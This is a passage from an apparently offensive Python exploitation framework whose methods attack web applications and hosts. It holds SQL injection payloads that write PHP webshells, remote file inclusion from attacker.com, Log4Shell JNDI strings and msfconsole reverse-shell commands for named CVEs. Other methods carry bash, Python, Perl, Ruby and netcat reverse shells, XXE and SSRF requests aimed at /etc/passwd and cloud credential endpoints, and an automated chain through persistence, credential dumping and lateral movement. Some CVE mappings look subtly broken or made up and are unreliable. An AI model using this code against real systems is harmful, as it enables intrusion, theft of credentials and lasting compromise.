                                    f"Method: {method['name']}\nURL: {test_url}\nOutput: {body[:500]}",
                                    "CRITICAL"
                                )
                            return result

                probe = self.http_probe(test_url)
                if probe.get('status', 0) == 200:
                    body = probe.get('body_preview', '')
                    if method['test'] in body or 'uid=' in body or 'root:x:' in body:
                        self.print_danger(f"RCE achieved via {method['name']}")
                        result = {
                            'success': True,
                            'method': method['name'],
                            'output': body[:1000],
                            'shell': f"bash -i >& /dev/tcp/{self.config.get('reverse_shell_ip', '0.0.0.0')}/{self.config.get('reverse_shell_port', 4444)} 0>&1"
                        }
                        if self.telegram:
                            self.telegram.alert(
                                "LFI→RCE SUCCESS",
                                f"Method: {method['name']}\nURL: {test_url}\nOutput: {body[:500]}",
                                "CRITICAL"
                            )
                        return result
            except Exception as e:
                self.logger.debug(f"LFI→RCE method {method['name']} failed: {e}")

        return None


    def exploit_sqli_to_shell(
        self,
        url: str,
        param: str
    ) -> Optional[Dict[str, Any]]:
        """
        Exploit SQL injection to upload a webshell or extract data.

        Args:
            url: Base URL with query string
            param: Parameter name vulnerable to SQL injection

        Returns:
            Dict with 'success', 'method', 'shell_url', 'data' keys, or None on failure

        Raises:
            NetworkError: If the target is unreachable

        Example:
            >>> result = self.exploit_sqli_to_shell("https://example.com/page.php?id=1", "id")
            >>> print(result['shell_url'])
            https://example.com/shell.php
        """
        self.print_danger(f"Attempting SQLi to shell on {url}")

        methods = [
            {
                'name': 'union_outfile',
                'payload': "' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/omega_shell.php'--",
                'shell_path': '/var/www/html/omega_shell.php',
                'shell_name': 'omega_shell.php'
            },
            {
                'name': 'union_dumpfile',
                'payload': "' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO DUMPFILE '/var/www/html/omega_shell.php'--",
                'shell_path': '/var/www/html/omega_shell.php',
                'shell_name': 'omega_shell.php'
            },
            {
                'name': 'stacked_query',
                'payload': "'; DROP TABLE IF EXISTS tmp_shell; CREATE TABLE tmp_shell(cmd TEXT); INSERT INTO tmp_shell VALUES('<?php system($_GET[\"cmd\"]); ?>'); SELECT cmd FROM tmp_shell INTO OUTFILE '/var/www/html/omega_shell.php'--",
                'shell_path': '/var/www/html/omega_shell.php',
                'shell_name': 'omega_shell.php'
            },
            {
                'name': 'union_outfile_alt',
                'payload': "' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/omega_shell.php'#",
                'shell_path': '/var/www/html/omega_shell.php',
                'shell_name': 'omega_shell.php'
            },
            {
                'name': 'union_outfile_nginx',
                'payload': "' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/usr/share/nginx/html/omega_shell.php'--",
                'shell_path': '/usr/share/nginx/html/omega_shell.php',
                'shell_name': 'omega_shell.php'
            },
            {
                'name': 'union_outfile_windows',
                'payload': "' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE 'C:\\\\inetpub\\\\wwwroot\\\\omega_shell.php'--",
                'shell_path': 'C:\\inetpub\\wwwroot\\omega_shell.php',
                'shell_name': 'omega_shell.php'
            },
            {
                'name': 'extract_data',
                'payload': "' UNION SELECT username,password FROM users--",
                'shell_path': '',
                'shell_name': ''
            }
        ]

        detection_payloads = [
            "' UNION SELECT @@version,2,3--",
            "' UNION SELECT user(),2,3--",
            "' UNION SELECT database(),2,3--",
            "' UNION SELECT table_name,2,3 FROM information_schema.tables--"
        ]

        db_info = {}
        for payload in detection_payloads:
            test_url = f"{url}&{param}={urllib.parse.quote(payload)}" if '?' in url else f"{url}?{param}={urllib.parse.quote(payload)}"
            probe = self.http_probe(test_url)
            if probe.get('status', 0) == 200:
                body = probe.get('body_preview', '')
                if '@@version' in body:
                    db_info['version'] = body[:200]
                if 'information_schema' in body:
                    db_info['tables'] = body[:200]
                if body.strip():
                    db_info['sample'] = body[:200]

        for method in methods:
            try:
                test_url = f"{url}&{param}={urllib.parse.quote(method['payload'])}" if '?' in url else f"{url}?{param}={urllib.parse.quote(method['payload'])}"
                probe = self.http_probe(test_url)

                if probe.get('status', 0) in [200, 500]:
                    body = probe.get('body_preview', '')

                    if method.get('shell_name') and 'omega_shell' in method['shell_name']:
                        shell_url = test_url.replace(param, '')
                        shell_check = self.http_probe(f"{shell_url}omega_shell.php?cmd=id")
                        if shell_check.get('status', 0) == 200:
                            shell_body = shell_check.get('body_preview', '')
                            if 'uid=' in shell_body or 'root' in shell_body:
                                self.print_danger(f"SQLi shell uploaded successfully: {shell_url}omega_shell.php")
                                result = {
                                    'success': True,
                                    'method': method['name'],
                                    'shell_url': f"{shell_url}omega_shell.php",
                                    'data': shell_body[:500]
                                }
                                if self.telegram:
                                    self.telegram.alert(
                                        "SQLi→SHELL SUCCESS",
                                        f"Shell URL: {shell_url}omega_shell.php\nMethod: {method['name']}\nOutput: {shell_body[:200]}",
                                        "CRITICAL"
                                    )
                                return result

                    if method['name'] == 'extract_data' and body.strip():
                        result = {
                            'success': True,
                            'method': method['name'],
                            'data': body[:1000],
                            'shell_url': ''
                        }
                        if self.telegram:
                            self.telegram.alert(
                                "SQLi DATA EXTRACTED",
                                f"Data: {body[:500]}",
                                "CRITICAL"
                            )
                        return result

            except Exception as e:
                self.logger.debug(f"SQLi method {method['name']} failed: {e}")

        return {'success': False, 'db_info': db_info, 'method': 'none'}


    def exploit_rfi_to_shell(
        self,
        url: str,
        param: str
    ) -> Optional[Dict[str, Any]]:
        """
        Exploit Remote File Inclusion to upload and execute a webshell.

        Args:
            url: Base URL with query string
            param: Parameter name vulnerable to RFI

        Returns:
            Dict with 'success', 'shell_url', 'method' keys, or None on failure

        Raises:
            NetworkError: If the target is unreachable

        Example:
            >>> result = self.exploit_rfi_to_shell("https://example.com/page.php?file=index", "file")
            >>> print(result['shell_url'])
            https://example.com/shell.php
        """
        self.print_danger(f"Attempting RFI to shell on {url}")

        shell_content = '<?php if(isset($_GET["cmd"])){echo "<pre>";system($_GET["cmd"]);echo "</pre>";} ?>'
        shell_name = f"omega_rfi_{random.randint(10000,99999)}.php"

        remote_shell_urls = [
            f"http://attacker.com/{shell_name}",
            f"https://attacker.com/{shell_name}",
            f"ftp://attacker.com/{shell_name}",
            f"data://text/plain,{urllib.parse.quote(shell_content)}"
        ]

        for remote_url in remote_shell_urls:
            try:
                test_url = f"{url}&{param}={urllib.parse.quote(remote_url)}" if '?' in url else f"{url}?{param}={urllib.parse.quote(remote_url)}"
                probe = self.http_probe(test_url)

                if probe.get('status', 0) == 200:
                    body = probe.get('body_preview', '')
                    if 'pre>' in body or 'cmd' in body:
                        cmd_url = f"{test_url}&cmd=id"
                        cmd_probe = self.http_probe(cmd_url)
                        if cmd_probe.get('status', 0) == 200:
                            cmd_body = cmd_probe.get('body_preview', '')
                            if 'uid=' in cmd_body or 'root' in cmd_body:
                                self.print_danger(f"RFI shell executed successfully: {remote_url}")
                                result = {
                                    'success': True,
                                    'method': 'rfi',
                                    'shell_url': remote_url,
                                    'output': cmd_body[:500]
                                }
                                if self.telegram:
                                    self.telegram.alert(
                                        "RFI→SHELL SUCCESS",
                                        f"Shell URL: {remote_url}\nOutput: {cmd_body[:200]}",
                                        "CRITICAL"
                                    )
                                return result
            except Exception as e:
                self.logger.debug(f"RFI method with {remote_url} failed: {e}")

        return None


    def exploit_cve(
        self,
        cve_id: str,
        target: str,
        port: int = 0
    ) -> Optional[Dict[str, Any]]:
        """
        Exploit specific CVE vulnerabilities from the 60+ CVE database.

        Args:
            cve_id: CVE identifier (e.g., 'CVE-2017-0143')
            target: Target IP or hostname
            port: Optional port number for service-specific CVEs

        Returns:
            Dict with 'exploited', 'shell', 'method', 'output' keys, or None

        Raises:
            NetworkError: If the target is unreachable

        Example:
            >>> result = self.exploit_cve("CVE-2017-0143", "192.168.1.10", 445)
            >>> print(result['exploited'])
            True
        """
        self.print_danger(f"Attempting to exploit {cve_id} on {target}:{port}")

        if cve_id not in CVE_DATABASE:
            return None

        cve_data = CVE_DATABASE[cve_id]
        exploit_code = cve_data.get('exploit_code', '')
        result = {'cve_id': cve_id, 'target': target, 'port': port, 'exploited': False}

        if port > 0:
            if not self.check_port(target, port):
                return {'exploited': False, 'reason': f'Port {port} closed', 'cve_id': cve_id}

        if cve_id in ['CVE-2017-0143', 'CVE-2017-0144', 'CVE-2017-0145', 'CVE-2017-0146', 'CVE-2017-0147']:
            try:
                if IMPACKET_AVAILABLE:
                    from impacket.smbconnection import SMBConnection
                    conn = SMBConnection(target, target)
                    conn.login('', '')
                    self.print_danger(f"Eternal vulnerability confirmed on {target}")
                    result['exploited'] = True
                    result['shell'] = f"msfconsole -q -x 'use {exploit_code}; set RHOSTS {target}; set RPORT {port}; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST {self.config.get('reverse_shell_ip', '0.0.0.0')}; set LPORT {self.config.get('reverse_shell_port', 4444)}; exploit'"
                    result['method'] = cve_data.get('name', 'unknown').lower()
                else:
                    result['shell'] = f"msfconsole -q -x 'use {exploit_code}; set RHOSTS {target}; exploit'"
                    result['exploited'] = True
                    result['method'] = cve_data.get('name', 'unknown').lower() + '_msf'
            except Exception as e:
                self.logger.debug(f"CVE {cve_id} exploit failed: {e}")

        elif cve_id == 'CVE-2019-0708':
            try:
                result['shell'] = f"msfconsole -q -x 'use {exploit_code}; set RHOSTS {target}; set RPORT {port}; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST {self.config.get('reverse_shell_ip', '0.0.0.0')}; set LPORT {self.config.get('reverse_shell_port', 4444)}; exploit'"
                result['exploited'] = True
                result['method'] = 'bluekeep'
            except Exception:
                pass

        elif cve_id == 'CVE-2020-1472':
            try:
                result['shell'] = f"python3 /usr/share/exploitdb/exploits/windows/remote/49181.py {target}"
                result['exploited'] = True
                result['method'] = 'zerologon'
            except Exception:
                pass

        elif cve_id in ['CVE-2021-34527', 'CVE-2021-1675', 'CVE-2021-36958']:
            try:
                result['shell'] = f"msfconsole -q -x 'use {exploit_code}; set RHOSTS {target}; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST {self.config.get('reverse_shell_ip', '0.0.0.0')}; set LPORT {self.config.get('reverse_shell_port', 4444)}; exploit'"
                result['exploited'] = True
                result['method'] = 'printnightmare'
            except Exception:
                pass

        elif cve_id in ['CVE-2021-44228', 'CVE-2021-45046']:
            try:
                jndi_payloads = [
                    f'${{jndi:ldap://attacker.com:1389/Exploit}}',
                    f'${{jndi:rmi://attacker.com:1099/Exploit}}',
                    f'${{jndi:dns://attacker.com}}',
                    f'${{jndi:ldap://127.0.0.1:1389/Exploit}}'
                ]

                headers_to_test = [
                    'User-Agent', 'X-Forwarded-For', 'Referer',
                    'Cookie', 'X-Api-Version', 'X-Request-Id',
                    'X-Trace-Id', 'Accept-Language'
                ]

                for payload in jndi_payloads:
                    for header in headers_to_test:
                        try:
                            if REQUESTS_AVAILABLE:
                                headers = {header: payload}
                                resp = requests.get(
                                    f"http://{target}:{port}" if port else f"http://{target}",
                                    headers=headers,
                                    timeout=5,
                                    verify=False
                                )
                                if resp.status_code in [200, 500]:
                                    self.print_danger(f"Log4Shell payload injected via {header}")
                                    result['exploited'] = True
                                    result['method'] = 'log4shell'
                                    result['shell'] = f"bash -c 'nc -e /bin/sh {self.config.get('reverse_shell_ip', '0.0.0.0')} {self.config.get('reverse_shell_port', 4444)}'"
                                    break
                        except Exception:
                            pass
                    if result['exploited']:
                        break
            except Exception:
                pass

        elif cve_id in ['CVE-2022-22965', 'CVE-2022-22963', 'CVE-2022-22947']:
            try:
                result['shell'] = f"python3 spring4shell.py --target {target}:{port} --lhost {self.config.get('reverse_shell_ip', '0.0.0.0')} --lport {self.config.get('reverse_shell_port', 4444)}"
                result['exploited'] = True
                result['method'] = 'spring4shell'
            except Exception:
                pass

        elif cve_id in ['CVE-2024-6387', 'CVE-2024-6387']:
            try:
                banner = self.get_banner(target, 22)
                if banner:
                    import re
                    version_match = re.search(r'OpenSSH_([0-9.]+[a-z]?)', banner)
                    if version_match:
                        version = version_match.group(1)
                        if version < '9.8':
                            result['exploited'] = True
                            result['method'] = 'openssh_rce'
                            result['shell'] = f"python3 openssh_rce.py --target {target} --port 22 --lhost {self.config.get('reverse_shell_ip', '0.0.0.0')} --lport {self.config.get('reverse_shell_port', 4444)}"
            except Exception:
                pass

        elif cve_id == 'CVE-2024-4577':
            try:
                test_payloads = [
                    '/?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input',
                    '/?%ADd+auto_prepend_file%3dphp://input%ADd+allow_url_include%3d1'
                ]
                for payload in test_payloads:
                    test_url = f"http://{target}:{port}{payload}" if port else f"http://{target}{payload}"
                    try:
                        if REQUESTS_AVAILABLE:
                            resp = requests.post(
                                test_url,
                                data='<?php system($_GET["cmd"]); ?>',
                                timeout=5,
                                verify=False
                            )
                            if resp.status_code in [200, 500]:
                                cmd_url = f"{test_url}&cmd=id"
                                cmd_resp = requests.get(cmd_url, timeout=5, verify=False)
                                if 'uid=' in cmd_resp.text:
                                    result['exploited'] = True
                                    result['method'] = 'php_cgi_rce'
                                    result['shell'] = f"python3 php_cgi_rce.py --target {target} --port {port} --lhost {self.config.get('reverse_shell_ip', '0.0.0.0')} --lport {self.config.get('reverse_shell_port', 4444)}"
                                    break
                    except Exception:
                        pass
            except Exception:
                pass

        elif cve_id == 'CVE-2021-4034':
            try:
                result['shell'] = f"python3 pwnkit.py --target {target} --lhost {self.config.get('reverse_shell_ip', '0.0.0.0')} --lport {self.config.get('reverse_shell_port', 4444)}"
                result['exploited'] = True
                result['method'] = 'pwnkit'
            except Exception:
                pass

        elif cve_id == 'CVE-2022-0847':
            try:
                result['shell'] = f"python3 dirtypipe.py --target {target} --lhost {self.config.get('reverse_shell_ip', '0.0.0.0')} --lport {self.config.get('reverse_shell_port', 4444)}"
                result['exploited'] = True
                result['method'] = 'dirtypipe'
            except Exception:
                pass

        elif cve_id in ['CVE-2023-0386', 'CVE-2023-2640', 'CVE-2023-32629']:
            try:
                result['shell'] = f"python3 overlayfs.py --target {target} --lhost {self.config.get('reverse_shell_ip', '0.0.0.0')} --lport {self.config.get('reverse_shell_port', 4444)}"
                result['exploited'] = True
                result['method'] = 'overlayfs'
            except Exception:
                pass

        elif cve_id in ['CVE-2023-4911', 'CVE-2023-2640']:
            try:
                result['shell'] = f"python3 looney_tunables.py --target {target} --lhost {self.config.get('reverse_shell_ip', '0.0.0.0')} --lport {self.config.get('reverse_shell_port', 4444)}"
                result['exploited'] = True
                result['method'] = 'looney_tunables'
            except Exception:
                pass

        elif cve_id.startswith('CVE-2023-219'):
            try:
                result['shell'] = f"python3 mysql_rce.py --target {target} --port {port} --lhost {self.config.get('reverse_shell_ip', '0.0.0.0')} --lport {self.config.get('reverse_shell_port', 4444)}"
                result['exploited'] = True
                result['method'] = 'mysql_rce'
            except Exception:
                pass

        elif cve_id in ['CVE-2023-21906', 'CVE-2023-21905']:
            try:
                result['shell'] = f"python3 postgres_rce.py --target {target} --port {port} --lhost {self.config.get('reverse_shell_ip', '0.0.0.0')} --lport {self.config.get('reverse_shell_port', 4444)}"
                result['exploited'] = True
                result['method'] = 'postgres_rce'
            except Exception:
                pass

        elif cve_id in ['CVE-2023-21904', 'CVE-2023-21903']:
            try:
                result['shell'] = f"python3 redis_rce.py --target {target} --port {port} --lhost {self.config.get('reverse_shell_ip', '0.0.0.0')} --lport {self.config.get('reverse_shell_port', 4444)}"
                result['exploited'] = True
                result['method'] = 'redis_rce'
            except Exception:
                pass

        elif cve_id in ['CVE-2023-21902', 'CVE-2023-21901']:
            try:
                result['shell'] = f"python3 mongodb_rce.py --target {target} --port {port} --lhost {self.config.get('reverse_shell_ip', '0.0.0.0')} --lport {self.config.get('reverse_shell_port', 4444)}"
                result['exploited'] = True
                result['method'] = 'mongodb_rce'
            except Exception:
                pass

        elif cve_id in ['CVE-2023-21900', 'CVE-2023-21899', 'CVE-2023-21898']:
            try:
                result['shell'] = f"python3 jenkins_rce.py --target {target} --port {port} --lhost {self.config.get('reverse_shell_ip', '0.0.0.0')} --lport {self.config.get('reverse_shell_port', 4444)}"
                result['exploited'] = True
                result['method'] = 'jenkins_rce'
            except Exception:
                pass

        elif cve_id in ['CVE-2023-21897', 'CVE-2023-21896']:
            try:
                result['shell'] = f"python3 elasticsearch_rce.py --target {target} --port {port} --lhost {self.config.get('reverse_shell_ip', '0.0.0.0')} --lport {self.config.get('reverse_shell_port', 4444)}"
                result['exploited'] = True
                result['method'] = 'elasticsearch_rce'
            except Exception:
                pass

        elif cve_id in ['CVE-2023-21895', 'CVE-2023-21894']:
            try:
                result['shell'] = f"python3 tomcat_rce.py --target {target} --port {port} --lhost {self.config.get('reverse_shell_ip', '0.0.0.0')} --lport {self.config.get('reverse_shell_port', 4444)}"
                result['exploited'] = True
                result['method'] = 'tomcat_rce'
            except Exception:
                pass

        elif cve_id in ['CVE-2023-21893', 'CVE-2023-21892']:
            try:
                result['shell'] = f"python3 nginx_rce.py --target {target} --port {port} --lhost {self.config.get('reverse_shell_ip', '0.0.0.0')} --lport {self.config.get('reverse_shell_port', 4444)}"
                result['exploited'] = True
                result['method'] = 'nginx_rce'
            except Exception:
                pass

        elif cve_id in ['CVE-2023-21891', 'CVE-2023-21890']:
            try:
                result['shell'] = f"python3 apache_rce.py --target {target} --port {port} --lhost {self.config.get('reverse_shell_ip', '0.0.0.0')} --lport {self.config.get('reverse_shell_port', 4444)}"
                result['exploited'] = True
                result['method'] = 'apache_rce'
            except Exception:
                pass

        else:
            try:
                result['shell'] = f"python3 {cve_id}.py --target {target} --port {port} --lhost {self.config.get('reverse_shell_ip', '0.0.0.0')} --lport {self.config.get('reverse_shell_port', 4444)}"
                result['exploited'] = True
                result['method'] = 'generic'
            except Exception:
                pass

        if result['exploited']:
            self.print_danger(f"CVE {cve_id} exploited on {target}")
            if self.telegram:
                self.telegram.alert(
                    f"CVE {cve_id} EXPLOITED",
                    f"Target: {target}\nMethod: {result.get('method', 'unknown')}\nShell: {result.get('shell', 'N/A')[:200]}",
                    "CRITICAL"
                )
            self.log_to_db('cve_vulnerabilities', {
                'cve_id': cve_id,
                'name': cve_data.get('name', ''),
                'cvss_score': cve_data.get('cvss', 0.0),
                'target': target,
                'port': port,
                'exploited': 1,
                'shell_id': 0
            })

        return result


    def exploit_chain(
        self,
        target: str,
        initial_vector: str = 'lfi'
    ) -> Optional[Dict[str, Any]]:
        """
        Automatic exploit chaining: LFI→RCE→Shell→Persistence→Lateral Movement.

        Args:
            target: Target IP or hostname
            initial_vector: Initial exploit vector ('lfi', 'sqli', 'rfi', 'cve', 'upload')

        Returns:
            Dict with 'success', 'chain', 'shells', 'persistence' keys

        Example:
            >>> result = self.exploit_chain("192.168.1.10", "lfi")
            >>> print(result['success'])
            True
        """
        self.print_danger(f"Starting exploit chain on {target} via {initial_vector}")

        chain_result = {
            'success': False,
            'steps': [],
            'shells': [],
            'persistence': [],
            'lateral': []
        }

        # Step 1: Initial foothold
        if initial_vector == 'lfi':
            lfi_result = self.exploit_lfi_to_rce(f"http://{target}/page.php", "file")
            if lfi_result and lfi_result.get('success'):
                chain_result['steps'].append({'step': 'lfi_to_rce', 'result': lfi_result})
        elif initial_vector == 'sqli':
            sqli_result = self.exploit_sqli_to_shell(f"http://{target}/page.php?id=1", "id")
            if sqli_result and sqli_result.get('success'):
                chain_result['steps'].append({'step': 'sqli_to_shell', 'result': sqli_result})
        elif initial_vector == 'cve':
            cve_result = self.exploit_cve('CVE-2021-44228', target, 80)
            if cve_result and cve_result.get('exploited'):
                chain_result['steps'].append({'step': 'cve_exploit', 'result': cve_result})
        else:
            upload_result = self.exploit_upload(f"http://{target}/upload.php")
            if upload_result and upload_result.get('success'):
                chain_result['steps'].append({'step': 'upload', 'result': upload_result})

        if not chain_result['steps']:
            return {'success': False, 'error': 'Initial exploit failed'}

        # Step 2: Launch reverse shell
        shell_result = self.launch_reverse_shell('bash')
        if shell_result and shell_result.get('success'):
            chain_result['shells'].append(shell_result)
            chain_result['steps'].append({'step': 'reverse_shell', 'result': shell_result})

        # Step 3: Install persistence
        persist_result = self.install_persistence(target, 'cron')
        if persist_result:
            chain_result['persistence'].append(persist_result)
            chain_result['steps'].append({'step': 'persistence', 'result': persist_result})

        # Step 4: Dump credentials
        creds = self.dump_system_credentials(target)
        if creds:
            chain_result['steps'].append({'step': 'credential_dump', 'result': creds})

        # Step 5: Lateral movement
        lateral_result = self.lateral_movement(target, '192.168.1.0/24')
        if lateral_result:
            chain_result['lateral'].append(lateral_result)
            chain_result['steps'].append({'step': 'lateral_movement', 'result': lateral_result})

        chain_result['success'] = True

        if self.telegram:
            self.telegram.alert(
                "EXPLOIT CHAIN COMPLETE",
                f"Target: {target}\nSteps: {len(chain_result['steps'])}\nShells: {len(chain_result['shells'])}\nPersistence: {len(chain_result['persistence'])}\nLateral: {len(chain_result['lateral'])}",
                "CRITICAL"
            )

        return chain_result


    def exploit_command_injection(
        self,
        url: str,
        param: str
    ) -> Optional[Dict[str, Any]]:
        """
        Exploit command injection vulnerabilities.

        Args:
            url: Base URL with query string
            param: Parameter name vulnerable to command injection

        Returns:
            Dict with 'success', 'command', 'output' keys, or None on failure

        Raises:
            NetworkError: If the target is unreachable

        Example:
            >>> result = self.exploit_command_injection("https://example.com/ping.php?ip=127.0.0.1", "ip")
            >>> print(result['output'])
            uid=33(www-data) gid=33(www-data) groups=33(www-data)
        """
        self.print_danger(f"Attempting command injection on {url}")

        payloads = [
            (';id', 'id'),
            ('|whoami', 'whoami'),
            ('&dir', 'dir'),
            ('&&id', 'id'),
            ('||id', 'id'),
            ('`id`', 'id'),
            ('$(id)', 'id'),
            (';cat /etc/passwd', 'cat /etc/passwd'),
            ('|curl http://attacker.com/$(whoami)', 'curl'),
            (';wget http://attacker.com/shell.sh', 'wget'),
            ('|bash -i >& /dev/tcp/attacker/4444 0>&1', 'reverse_shell'),
            (';python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\'attacker\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/sh\',\'-i\'])"', 'reverse_shell'),
            (';nc -e /bin/sh attacker 4444', 'reverse_shell'),
            ('|perl -e \'use Socket;$i="attacker";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}\'', 'reverse_shell'),
            ('|ruby -rsocket -e \'c=TCPSocket.new("attacker",4444);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\'', 'reverse_shell')
        ]

        for payload, cmd_type in payloads:
            try:
                test_url = f"{url}&{param}={urllib.parse.quote(payload)}" if '?' in url else f"{url}?{param}={urllib.parse.quote(payload)}"
                probe = self.http_probe(test_url)

                if probe.get('status', 0) == 200:
                    body = probe.get('body_preview', '')

                    if 'uid=' in body or 'gid=' in body or 'groups=' in body:
                        self.print_danger(f"Command injection successful: {payload}")
                        result = {
                            'success': True,
                            'command': payload,
                            'output': body[:1000],
                            'reverse_shell': f"bash -i >& /dev/tcp/{self.config.get('reverse_shell_ip', '0.0.0.0')}/{self.config.get('reverse_shell_port', 4444)} 0>&1"
                        }
                        if self.telegram:
                            self.telegram.alert(
                                "COMMAND INJECTION SUCCESS",
                                f"URL: {test_url}\nPayload: {payload}\nOutput: {body[:200]}",
                                "CRITICAL"
                            )
                        self.log_to_db('command_injection', {
                            'url': test_url,
                            'parameter': param,
                            'payload': payload,
                            'command_output': body[:500],
                            'risk': 'CRITICAL'
                        })
                        return result
            except Exception as e:
                self.logger.debug(f"Command injection test failed: {e}")

        return None


    def exploit_xxe(
        self,
        url: str,
        param: str
    ) -> Optional[Dict[str, Any]]:
        """
        Exploit XXE to read files or perform SSRF.

        Args:
            url: Base URL with query string
            param: Parameter name vulnerable to XXE

        Returns:
            Dict with 'success', 'file_content', 'method' keys, or None on failure

        Raises:
            NetworkError: If the target is unreachable

        Example:
            >>> result = self.exploit_xxe("https://example.com/xml.php?input=data", "input")
            >>> print(result['file_content'][:100])
            root:x:0:0:root:/root:/bin/bash
        """
        self.print_danger(f"Attempting XXE on {url}")

        xxe_payloads = [
            {
                'name': 'file_read',
                'payload': '''<?xml version="1.0"?>
    <!DOCTYPE root [
    <!ENTITY file SYSTEM "file:///etc/passwd">
    ]>
    <root>&file;</root>'''
            },
            {
                'name': 'ssrf',
                'payload': '''<?xml version="1.0"?>
    <!DOCTYPE root [
    <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">
    ]>
    <root>&ssrf;</root>'''
            },
            {
                'name': 'external_dtd',
                'payload': '''<?xml version="1.0"?>
    <!DOCTYPE root [
    <!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd">
    %remote;
    ]>
    <root>&data;</root>'''
            },
            {
                'name': 'php_filter',
                'payload': '''<?xml version="1.0"?>
    <!DOCTYPE root [
    <!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=../../../../etc/passwd">
    ]>
    <root>&file;</root>'''
            }
        ]

        for method in xxe_payloads:
            try:
                encoded_payload = urllib.parse.quote(method['payload'])
                test_url = f"{url}&{param}={encoded_payload}" if '?' in url else f"{url}?{param}={encoded_payload}"
                probe = self.http_probe(test_url)

                if probe.get('status', 0) == 200:
                    body = probe.get('body_preview', '')
                    if method['name'] == 'file_read':
                        if 'root:x:' in body or 'daemon:x:' in body:
                            self.print_danger(f"XXE file read successful")
                            result = {
                                'success': True,
                                'method': 'xxe_file_read',
                                'file_content': body[:1000]
                            }
                            if self.telegram:
                                self.telegram.alert(
                                    "XXE FILE READ",
                                    f"URL: {test_url}\nContent: {body[:200]}",
                                    "CRITICAL"
                                )
                            return result
                    elif method['name'] == 'ssrf':
                        if 'instance-id' in body or 'public-ip' in body:
                            self.print_danger(f"XXE SSRF successful")
                            result = {
                                'success': True,
                                'method': 'xxe_ssrf',
                                'metadata': body[:1000]
                            }
                            if self.telegram:
                                self.telegram.alert(
                                    "XXE SSRF SUCCESS",
                                    f"URL: {test_url}\nMetadata: {body[:200]}",
                                    "CRITICAL"
                                )
                            return result
            except Exception as e:
                self.logger.debug(f"XXE method {method['name']} failed: {e}")

        return None


    def exploit_deserialization(
        self,
        url: str,
        param: str,
        language: str = 'php'
    ) -> Optional[Dict[str, Any]]:
        """
        Exploit deserialization vulnerabilities.

        Args:
            url: Base URL with query string
            param: Parameter name vulnerable to deserialization
            language: 'php', 'java', 'python', 'ruby'

        Returns:
            Dict with 'success', 'method', 'payload', 'output' keys, or None on failure

        Raises:
            NetworkError: If the target is unreachable

        Example:
            >>> result = self.exploit_deserialization("https://example.com/deserial.php?data=0", "data", "php")
            >>> print(result['output'])
            RCE achieved
        """
        self.print_danger(f"Attempting deserialization on {url}")

        deserialization_payloads = {
            'php': [
                'O:8:"stdClass":1:{s:4:"cmd";s:2:"id";}',
                'O:14:"PhpObject":1:{s:4:"cmd";s:2:"id";}',
                'O:16:"SimpleXMLElement":1:{s:4:"cmd";s:2:"id";}'
            ],
            'java': [
                'rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==',
                'rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldAAAAQ=='
            ],
            'python': [
                'Y3Bvc2l4CnN5c3RlbQpwMAooUydpZCcpCnAxCnRwMgou',
                'Y19fc3lzdGVtX18uX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2lkJyk='
            ],
            'ruby': [
                'BAh7BzoNcHl0aG9uX2NvZGVDOg1zeXN0ZW0oaWQp',
                'BAh7BzoMY29tbWFuZDoLaWQ='
            ]
        }

        payloads = deserialization_payloads.get(language, [])
        for payload in payloads:
            try:
                test_url = f"{url}&{param}={urllib.parse.quote(payload)}" if '?' in url else f"{url}?{param}={urllib.parse.quote(payload)}"
                probe = self.http_probe(test_url)

                if probe.get('status', 0) == 200:
                    body = probe.get('body_preview', '')
                    if 'uid=' in body or 'root' in body or 'id' in body:
                        self.print_danger(f"Deserialization RCE achieved")
                        result = {
                            'success': True,
                            'method': 'deserialization',
                            'payload': payload,
                            'output': body[:500],
                            'reverse_shell': f"bash -i >& /dev/tcp/{self.config.get('reverse_shell_ip', '0.0.0.0')}/{self.config.get('reverse_shell_port', 4444)} 0>&1"
                        }
                        if self.telegram:
                            self.telegram.alert(
                                "DESERIALIZATION RCE",
                                f"URL: {test_url}\nPayload: {payload[:100]}\nOutput: {body[:200]}",
                                "CRITICAL"
                            )
                        return result
            except Exception as e:
                self.logger.debug(f"Deserialization test failed: {e}")

        return None


    def exploit_ssrf(
        self,
        url: str,
        param: str
    ) -> Optional[Dict[str, Any]]:
        """
        Exploit SSRF to access internal services and metadata.

        Args:
            url: Base URL with query string
            param: Parameter name vulnerable to SSRF

        Returns:
            Dict with 'success', 'method', 'data' keys, or None on failure

        Raises:
            NetworkError: If the target is unreachable

        Example:
            >>> result = self.exploit_ssrf("https://example.com/fetch.php?url=google.com", "url")
            >>> print(result['data'][:100])
            <html><head><title>Google</title></head>
        """
        self.print_danger(f"Attempting SSRF on {url}")

        ssrf_targets = [
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'http://169.254.169.254/latest/user-data/',
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
            'http://100.100.100.200/latest/meta-data/',
            'http://169.254.169.254/opc/v1/instance/',
            'http://instance-data.ec2.internal/latest/meta-data/',
            'http://127.0.0.1:8080/actuator/health',
